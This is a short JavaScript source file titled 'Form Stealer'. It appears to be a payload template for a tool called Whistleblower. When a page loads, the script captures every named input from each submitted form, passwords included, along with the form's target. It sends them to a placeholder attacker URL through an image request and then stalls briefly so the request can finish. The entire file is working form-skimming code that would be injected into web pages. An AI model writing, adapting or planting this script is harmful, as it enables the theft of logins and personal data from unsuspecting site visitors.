/*
 * Title:       Form Stealer
 * Author:      Ryan Govostes <rgovostes@gmail.com>
 * Description: Forwards submitted form data to the Whistleblower.
 */

// FIXME: Some versions of IE aren't supported. Do compatibility check.
// FIXME: Non-<input> form fields are not captured.
// TODO: It'd be nice if we handled forms that are subsequently added to the page.
// TODO: Find a better way to do the timeout loop.

window.addEventListener('load', function()
{
   for (var i = 0; i < document.forms.length; i ++)
   {
      document.forms[i].addEventListener('submit', function(event)
      {
         var f = event.target;
         
         // Collect the form data into a params dictionary
         var params = new Object;
         var inputs = f.getElementsByTagName('input');
         for (var j = 0; j < inputs.length; j ++)
            if (inputs[j].name)
               params[inputs[j].name] = inputs[j].value;

         // URL encode the parameters
         var paramstr =  'WB_FORM_ACTION=' + encodeURIComponent(f.action)
                      + '&WB_FORM_METHOD=' + encodeURIComponent(f.method);
         for (var name in params)
         {
            paramstr += '&'
                     +  encodeURIComponent(name)
                     +  '='
                     +  encodeURIComponent(params[name]);
         }

         // Use an image to send the parameters to the Whistleblower
         var img = new Image();
         img.src = '%%WB_URL%%/?' + paramstr;
         
         // Wait 0.5 second for the image resource to be fetched.
         var stop = new Date().getTime() + 500;
         while (new Date().getTime() < stop);
      }, true);
   }
}, true);
